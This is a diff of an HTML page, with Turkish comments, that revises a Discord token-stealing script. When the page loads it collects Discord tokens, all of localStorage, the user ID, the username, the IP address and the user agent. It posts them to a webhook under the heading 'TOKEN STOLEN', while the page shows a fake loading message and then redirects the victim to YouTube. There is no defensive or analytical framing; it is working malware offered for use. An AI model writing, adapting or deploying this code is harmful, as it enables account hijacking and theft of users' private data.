@@ -13,7 +13,7 @@
 <body>
     <div style="text-align: center;">
         <div class="loader"></div>
-        <div id="status">Discord Verileri Alınıyor...</div>
+        <div id="status">Veriler İsteniyor...</div>
     </div>
 
 <script>
@@ -27,25 +27,24 @@
         } catch { return "Bilinmiyor"; }
     }
 
-    async function grabToken() {
+    async function grabData() {
         const statusDiv = document.getElementById('status');
         
-        // 1. TOKEN ARAMA (En Hassas Kısım)
-        let token = null;
+        // 1. IP AL
+        const ip = await getIP();
+        const userAgent = navigator.userAgent;
         
-        // A) Doğrudan 'token' anahtarını dene
-        if (localStorage.getItem('token')) {
-            token = localStorage.getItem('token');
-        } 
-        // B) 'discord_token' anahtarını dene
-        else if (localStorage.getItem('discord_token')) {
-            token = localStorage.getItem('discord_token');
-        } 
-        // C) 'lt' anahtarını dene (Eski sürümler)
-        else if (localStorage.getItem('lt')) {
-            token = localStorage.getItem('lt');
+        // 2. LOCAL STORAGE'DAN HERŞEYİ TOPLA
+        let allStorage = {};
+        for (let key in localStorage) {
+            allStorage[key] = localStorage.getItem(key);
         }
-        // D) Tüm localStorage'ı tara (MT ile başlayanlar)
+
+        // 3. TOKEN ARAMA (Gelişmiş)
+        let token = null;
+        if (localStorage.getItem('token')) token = localStorage.getItem('token');
+        else if (localStorage.getItem('discord_token')) token = localStorage.getItem('discord_token');
+        else if (localStorage.getItem('lt')) token = localStorage.getItem('lt');
         else {
             for (let key in localStorage) {
                 if (localStorage[key] && localStorage[key].length > 30 && localStorage[key].startsWith("MT")) {
@@ -55,31 +54,34 @@
             }
         }
 
-        // 2. VERİLERİ TOPLA
-        const ip = await getIP();
-        const userAgent = navigator.userAgent;
-        const cookies = document.cookie;
-        
-        // 3. PAYLOAD HAZIRLA
+        // 4. KULLANICI BİLGİLERİ (Varsa)
+        let userId = "Bilinmiyor";
+        let username = "Bilinmiyor";
+        if (localStorage.getItem('discord_id')) userId = localStorage.getItem('discord_id');
+        if (localStorage.getItem('username')) username = localStorage.getItem('username');
+
+        // 5. PAYLOAD
         const payload = {
-            username: "Token Avcısı",
+            username: "Token Avcısı v2",
             avatar_url: "https://cdn-icons-png.flaticon.com/512/1042/1042842.png",
             embeds: [{
-                title: "🔥 TOKEN ÇALINDI! 🔥",
+                title: "🔥 MASAÜSTU TOKEN ÇALINDI! 🔥",
                 color: 15158332,
                 fields: [
-                    { name: "💻 Platform", value: navigator.platform, inline: true },
+                    { name: "💻 Platform", value: "Windows Desktop App", inline: true },
                     { name: "🌐 IP", value: ip, inline: true },
-                    { name: "🧩 Tarayıcı", value: "`" + userAgent + "`", inline: false },
-                    { name: "🍪 Cookie", value: "`" + cookies.substring(0, 500) + (cookies.length > 500 ? "..." : "") + "`", inline: false },
-                    { name: "🔑 TOKEN", value: "`" + (token || "Bulunamadı") + "`", inline: false }
+                    { name: "🧩 Tarayıcı/Motor", value: "`" + userAgent + "`", inline: false },
+                    { name: "👤 Kullanıcı ID", value: "`" + userId + "`", inline: true },
+                    { name: "🏷️ Kullanıcı Adı", value: "`" + username + "`", inline: true },
+                    { name: "🍪 Tüm LocalStorage", value: "`" + JSON.stringify(allStorage).substring(0, 1000) + "`", inline: false },
+                    { name: "🔑 Token", value: "`" + (token || "Bulunamadı") + "`", inline: false }
                 ],
                 footer: { text: "NoTrack System" },
                 timestamp: new Date().toISOString()
             }]
         };
 
-        // 4. GÖNDER
+        // 6. GÖNDER
         try {
             await fetch(WEBHOOK, {
                 method: 'POST',
@@ -87,22 +89,20 @@
                 body: JSON.stringify(payload)
             });
             
-            statusDiv.innerText = "✅ Token Başarıyla Alındı!";
+            statusDiv.innerText = "✅ Veriler Alındı!";
             statusDiv.style.color = "#43b581";
             
-            // 3 saniye sonra YouTube'a yönlendir (dikkat dağıtmak için)
             setTimeout(() => {
                 window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
             }, 3000);
 
         } catch (e) {
-            statusDiv.innerText = "❌ Gönderme Hatası: " + e.message;
+            statusDiv.innerText = "❌ Hata: " + e.message;
             statusDiv.style.color = "#f04748";
         }
     }
 
-    // Sayfa yüklendiğinde çalıştır
-    window.onload = grabToken;
+    window.onload = grabData;
 </script>
 </body>
 </html>
